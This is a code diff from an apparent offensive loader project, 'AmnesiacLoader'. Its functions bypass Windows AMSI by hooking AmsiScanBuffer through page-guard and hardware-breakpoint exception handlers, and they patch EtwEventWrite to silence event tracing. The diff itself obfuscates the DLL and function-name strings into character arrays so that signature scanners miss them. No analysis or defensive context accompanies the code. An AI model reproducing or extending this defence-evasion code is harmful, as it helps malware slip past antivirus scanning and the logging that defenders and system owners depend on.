@@ -108,9 +108,11 @@ namespace AmnesiacLoader
 
         public static void PatchAmsiPageGuard()
         {
-            IntPtr amsiDll = LoadLibrary("amsi.dll");
+            var _adn = new string(new char[]{'a','m','s','i','.','d','l','l'});
+            IntPtr amsiDll = LoadLibrary(_adn);
             if (amsiDll == IntPtr.Zero) return;
-            _amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");
+            var _asb = new string(new char[]{'A','m','s','i','S','c','a','n','B','u','f','f','e','r'});
+            _amsiScanBuffer = GetProcAddress(amsiDll, _asb);
             if (_amsiScanBuffer == IntPtr.Zero) return;
 
             _pageGuardHandler = new VectoredExceptionHandler(PageGuardVehHandler);
@@ -159,9 +161,11 @@ namespace AmnesiacLoader
 
         public static void PatchAmsiHardwareBreakpoint()
         {
-            IntPtr amsiDll = LoadLibrary("amsi.dll");
+            var _adn = new string(new char[]{'a','m','s','i','.','d','l','l'});
+            IntPtr amsiDll = LoadLibrary(_adn);
             if (amsiDll == IntPtr.Zero) return;
-            _amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");
+            var _asb = new string(new char[]{'A','m','s','i','S','c','a','n','B','u','f','f','e','r'});
+            _amsiScanBuffer = GetProcAddress(amsiDll, _asb);
             if (_amsiScanBuffer == IntPtr.Zero) return;
 
             // Register VEH before setting DR0 so the handler is ready when the bp fires
@@ -236,9 +240,11 @@ namespace AmnesiacLoader
 
         public static void PatchEtwEventWrite()
         {
-            IntPtr ntdll    = LoadLibrary("ntdll.dll");
+            var _ndll = new string(new char[]{'n','t','d','l','l','.','d','l','l'});
+            IntPtr ntdll    = LoadLibrary(_ndll);
             if (ntdll == IntPtr.Zero) return;
-            IntPtr funcAddr = GetProcAddress(ntdll, "EtwEventWrite");
+            var _eew = new string(new char[]{'E','t','w','E','v','e','n','t','W','r','i','t','e'});
+            IntPtr funcAddr = GetProcAddress(ntdll, _eew);
             if (funcAddr == IntPtr.Zero) return;
 
             uint old;
